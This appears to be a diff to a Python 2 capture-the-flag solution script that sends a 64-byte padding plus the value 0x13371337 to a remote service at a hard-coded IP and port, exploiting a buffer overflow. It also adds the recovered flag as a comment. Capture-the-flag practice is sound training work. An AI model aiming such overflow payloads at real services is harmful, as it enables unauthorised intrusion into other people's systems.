@@ -4,15 +4,15 @@ import socket
 
 HOST = "104.236.80.67"
 PORT = 5681
-Payload = "A"*64 + "\x37\x13\x37\x13\n"
+payload = "A"*64 + "\x37\x13\x37\x13\n"
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((HOST, PORT))
-    sock.sendall(Payload)
+    sock.sendall(payload + "\n")
     print sock.recv(1024)
-    #print sock.recv(1024)
-    #print sock.recv(1024)
     sock.close()
 
 main()
+
+# Flag: buffer_overflows_are_pretty_bad
